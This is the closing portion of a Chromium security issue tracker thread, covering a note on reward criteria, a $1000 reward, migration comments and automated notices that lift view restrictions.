Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### mb...@chromium.org (2013-09-26)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-09-27)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-09-28)

$1000

### pa...@chromium.org (2013-10-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/286414?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/287160]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078063)*
